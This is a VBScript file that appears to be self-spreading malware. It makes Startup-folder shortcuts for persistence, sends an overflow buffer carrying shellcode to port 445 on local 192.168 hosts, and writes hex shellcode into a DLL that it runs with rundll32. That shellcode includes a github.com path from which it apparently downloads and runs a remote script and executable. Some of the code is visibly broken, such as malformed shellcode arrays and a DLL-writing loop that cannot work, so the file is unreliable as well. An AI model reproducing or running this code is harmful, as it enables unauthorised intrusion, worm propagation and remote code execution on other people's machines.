Dim filenames(4)
filenames(0) = "rhl.vbs"
filenames(1) = "littlejoe.vbs"
filenames(2) = "lj.vbs"
filenames(3) = "go.bat"
filenames(4) = "nogapi.dll"

Dim currentDirectory
Set fso = CreateObject("Scripting.FileSystemObject")
currentDirectory = fso.GetAbsolutePathName(".")

Set files = fso.GetFolder(currentDirectory).Files
For Each file In files
    For Each filename In filenames
        If LCase(file.Name) = LCase(filename) Then
            Set WshShell = CreateObject("WScript.Shell")
            startupPath = WshShell.SpecialFolders("Startup")
            Set registryKey = WshShell.CreateShortcut(startupPath & "\" & file.Name & ".lnk")
            registryKey.TargetPath = file.Path
            registryKey.Save
            Exit For
        End If
    Next
Next
Function GetIPAddresses()
  Dim arrIPAddresses
  arrIPAddresses = Array()
  
  Dim objWMIService
  Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
  
  Dim colItems
  Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
  
  Dim objItem
  For Each objItem in colItems
    Dim arrIPAddress
    arrIPAddress = objItem.IPAddress
    For Each strIPAddress in arrIPAddress
      If Left(strIPAddress, 7) = "192.168" Then
        ReDim Preserve arrIPAddresses(UBound(arrIPAddresses) + 1)
        arrIPAddresses(UBound(arrIPAddresses)) = strIPAddress
      End If
    Next
  Next
  
  GetIPAddresses = arrIPAddresses
End Function

Function Spridoj()
    Dim arrIPAddresses
    arrIPAddresses = GetIPAddresses()

    For Each strIPAddress in arrIPAddresses
    On Error Resume Next
    Set tcpClient = CreateObject("MSWinsock.Winsock")
    host = strIPAddress
    port = 445
    offset = 2000

    ' Offset and return address
    ret = Array(&H8F, &H35, &H4A, &H5F)

    shellcode = Array(buf=Chr(49)&Chr(201)&Chr(131)&Chr(233)&Chr(134)&Chr(232)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(192)&Chr(94)&Chr(129)&Chr(118)&Chr(14)&Chr(235)&Chr(254)&Chr(179)&Chr(243)&Chr(131)&Chr(238)&Chr(252)&Chr(226)&Chr(244)&Chr(23)&Chr(22)&Chr(58)&Chr(243)&Chr(235)&Chr(254)&Chr(211)&Chr(122)&Chr(14)&Chr(207)&Chr(97)&Chr(151)&Chr(96)&Chr(172)&Chr(131)&Chr(120)&Chr(185)&Chr(242)&Chr(56)&Chr(161)&Chr(255)&Chr(117)&Chr(193)&Chr(219)&Chr(228)&Chr(73)&Chr(249)&Chr(213)&Chr(218)&Chr(1)&Chr(130)&Chr(51)&Chr(71)&Chr(194)&Chr(210)&Chr(143)&Chr(233)&Chr(210)&Chr(147)&Chr(50)&Chr(36)&Chr(243)&Chr(178)&Chr(52)&Chr(9)&Chr(14)&Chr(225)&Chr(164)&Chr(96)&Chr(172)&Chr(163)&Chr(120)&Chr(169)&Chr(194)&Chr(178)&Chr(35)&Chr(96)&Chr(190)&Chr(203)&Chr(118)&Chr(43)&Chr(138)&Chr(249)&Chr(242)&Chr(59)&Chr(174)&Chr(56)&Chr(187)&Chr(243)&Chr(117)&Chr(235)&Chr(211)&Chr(234)&Chr(45)&Chr(80)&Chr(207)
buf=buf&Chr(162)&Chr(117)&Chr(135)&Chr(120)&Chr(234)&Chr(40)&Chr(130)&Chr(12)&Chr(218)&Chr(62)&Chr(31)&Chr(50)&Chr(36)&Chr(243)&Chr(178)&Chr(52)&Chr(211)&Chr(30)&Chr(198)&Chr(7)&Chr(232)&Chr(131)&Chr(75)&Chr(200)&Chr(150)&Chr(218)&Chr(198)&Chr(17)&Chr(179)&Chr(117)&Chr(235)&Chr(215)&Chr(234)&Chr(45)&Chr(213)&Chr(120)&Chr(231)&Chr(181)&Chr(56)&Chr(171)&Chr(247)&Chr(255)&Chr(96)&Chr(120)&Chr(239)&Chr(117)&Chr(178)&Chr(35)&Chr(98)&Chr(186)&Chr(151)&Chr(215)&Chr(176)&Chr(165)&Chr(210)&Chr(170)&Chr(177)&Chr(175)&Chr(76)&Chr(19)&Chr(179)&Chr(161)&Chr(233)&Chr(120)&Chr(249)&Chr(21)&Chr(53)&Chr(174)&Chr(131)&Chr(144)&Chr(214)&Chr(135)&Chr(235)&Chr(150)&Chr(196)&Chr(154)&Chr(133)&Chr(151)&Chr(58)&Chr(21)&Chr(191)&Chr(150)&Chr(255)&Chr(132)&Chr(205)&Chr(249)&Chr(76)&Chr(38)&Chr(218)&Chr(1)&Chr(228)&Chr(164)&Chr(188)&Chr(169)&Chr(229)&Chr(155)&Chr(209)&Chr(168)&Chr(202)&Chr(84)
buf=buf&Chr(20)&Chr(43)&Chr(88)&Chr(144)&Chr(176)&Chr(207)&Chr(122)&Chr(162)&Chr(186)&Chr(148)&Chr(176)&Chr(162)&Chr(186)&Chr(150)&Chr(8)&Chr(242)&Chr(235)&Chr(254)&Chr(224)&Chr(163)&Chr(131)&Chr(169)&Chr(58)&Chr(108)&Chr(45)&Chr(1)&Chr(102)&Chr(24)&Chr(164)&Chr(167)&Chr(130)&Chr(33)&Chr(185)&Chr(150)&Chr(179)&Chr(193)&Chr(75)&Chr(122)&Chr(225)&Chr(161)&Chr(185)&Chr(175)&Chr(225)&Chr(163)&Chr(131)&Chr(21)&Chr(230)&Chr(221)&Chr(208)&Chr(1)&Chr(102)&Chr(122)&Chr(45)&Chr(148)&Chr(163)&Chr(168)&Chr(131)&Chr(126)&Chr(128)&Chr(243)&Chr(235)&Chr(119)&Chr(83)&Chr(153)&Chr(239)&Chr(174)&Chr(217)&Chr(236)&Chr(189)&Chr(150)&Chr(198)&Chr(181)&Chr(117)&Chr(120)&Chr(76)&Chr(38)&Chr(218)&Chr(1)&Chr(228)&Chr(164)&Chr(188)&Chr(169)&Chr(229)&Chr(155)&Chr(198)&Chr(248)&Chr(171)&Chr(136)&Chr(20)&Chr(43)&Chr(54)&Chr(51)&Chr(158)&Chr(179)&Chr(248)&Chr(252)&Chr(111)&Chr(84)&Chr(179)&Chr(243)
buf=buf&Chr(235)&Chr(21)&Chr(98)&Chr(26)&Chr(87)&Chr(254)&Chr(179)&Chr(243)&Chr(3)&Chr(82)&Chr(76)&Chr(12)&Chr(20)&Chr(209)&Chr(216)&Chr(146)&Chr(132)&Chr(141)&Chr(224)&Chr(150)&Chr(136)&Chr(209)&Chr(216)&Chr(146)&Chr(132)&Chr(141)&Chr(231)&Chr(156)&Chr(132)&Chr(146)&Chr(192)&Chr(220)&Chr(153)&Chr(159)&Chr(196)&Chr(220)&Chr(134)&Chr(159)&Chr(218)&Chr(157)&Chr(196)&Chr(146)&Chr(198)&Chr(133)&Chr(145)&Chr(147)&Chr(218)&Chr(128)&Chr(136)&Chr(136)&Chr(209)&Chr(128)&Chr(196)&Chr(146)&Chr(218)&Chr(135)&Chr(159)&Chr(146)&Chr(214)&Chr(153)&Chr(132)&Chr(155)&Chr(156)&Chr(129)&Chr(131)&Chr(146)&Chr(157)&Chr(133)&Chr(137)&Chr(141)&Chr(179)&Chr(24)&Chr(128)&Chr(207)&Chr(115)&Chr(172)&Chr(187)&Chr(148)&Chr(177)&Chr(153)&Chr(233)&Chr(174)&Chr(217)&Chr(241)&Chr(129)&Chr(252)&Chr(228)&Chr(155)&Chr(49)&Chr(8)&Chr(105)&Chr(188)&Chr(20)&Chr(43)&Chr(32)&Chr(194)&Chr(43)&Chr(152)&Chr(11)&Chr(247)
buf=buf&Chr(232)&Chr(215)&Chr(119)&Chr(167)&Chr(102)&Chr(178)&Chr(151)&Chr(251)&Chr(218)&Chr(62)&Chr(7)&Chr(240)&Chr(187)&Chr(175)&Chr(229)&Chr(155)&Chr(249)&Chr(104)&Chr(58)&Chr(17)&Chr(20)&Chr(43)&Chr(54)&Chr(51)&Chr(159)&Chr(211)&Chr(235)&Chr(118)&Chr(43)&Chr(138)&Chr(165)&Chr(153)&Chr(235)&Chr(170)&Chr(227)&Chr(126)&Chr(175)&Chr(218)&Chr(191)&Chr(163)&Chr(184)&Chr(150)&Chr(158)&Chr(164)&Chr(69)&Chr(165)&Chr(76)&Chr(38)&Chr(104)&Chr(18)&Chr(183)&Chr(24)&Chr(37)&Chr(173)&Chr(219)&Chr(53)&Chr(125)&Chr(121)&Chr(225)&Chr(12)&Chr(62)&Chr(148)&Chr(179)&Chr(164)&Chr(131)&Chr(207)&Chr(56)&Chr(156)&Chr(108)&Chr(1)&Chr(102)&Chr(153)&Chr(235)&Chr(150)&Chr(67)&Chr(70)&Chr(73)&Chr(168)&Chr(76)&Chr(38)&Chr(3)&Chr(110)&Chr(76)&Chr(12)&Chr(20)&Chr(140)&Chr(198)&Chr(157)&Chr(143)&Chr(207)&Chr(130)&Chr(221)&Chr(142)&Chr(134)&Chr(214)&Chr(243)&Chr(3)&Chr(41)&Chr(77)&Chr(12)
buf=buf&Chr(20)&Chr(153)&Chr(218)&Chr(135)&Chr(131)&Chr(139)&Chr(209)&Chr(221)&Chr(136)&Chr(145)&Chr(222)&Chr(243))

    buf = "USER " & String(offset, "A") & ChrW(ret(0)) & ChrW(ret(1)) & ChrW(ret(2)) & ChrW(ret(3))
    For i = 1 To 20
        buf = buf & ChrW(&H90)
    Next
    For i = 0 To UBound(shellcode)
        buf = buf & ChrW(shellcode(i))
    Next
    buf = buf & vbCrLf

    tcpClient.Connect host, port

    tcpClient.SendData buf

    Do While tcpClient.State <> 0
        If tcpClient.State = 7 Then
            response = tcpClient.GetData
            WScript.Echo response
            Exit Do
        End If
        WScript.Sleep 100
    Loop

    tcpClient.Close
    If Err.Number = 0 Then
        ' Script executed successfully on remote machine
    End If
    Next
End Function

Function Kaoso()
Set objShell = CreateObject("WScript.Shell")
strCode = "fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865d686e6574006877696e6989e654684c772607ffd531ff5757575756683a5679a7ffd5eb635b31c951516a03515168bb01000053506857899fc6ffd5eb4f5931d252680032a08452525251525068eb552e3bffd589c66a105b688033000089e06a04506a1f566875469e86ffd531ff5757575756682d06187bffd585c0754d4b0f84aa000000ebd1e9bc000000e8acffffff2f6b616f735365632f6b616f73546f6f6c732f7261772f6d61696e2f6c75767a6d6973637662732f6c6974746c656a6f652f72686c2e76627300eb6b31c05f506a026a02506a026a025768daf6da4fffd59331c066b8040329c4548d4c240831c0b40350515668129689e2ffd585c0742d5885c074166a0054508d44240c5053682d57ae5bffd583ec04ebce5368c6968752ffd56a005768318b6f87ffd56a0068f0b5a256ffd5e890ffffff72756e6431312e65786500e8d7feffff6769746875622e636f6d00"
For i = 1 to Len(strCode) Step 2
    objShell.Run "cmd /c echo|" & Mid(strCode, i, 2) & " /nologo >> nogapi.dll", 0, True
Next
dllPath = "nogapi.dll"

Set kernel32 = GetObject("winmgmts:root\cimv2:Win32_Process")
result = kernel32.Create("rundll32 """ & dllPath & """,DllRegisterServer")
End Function
Spridoj()
Kaoso()
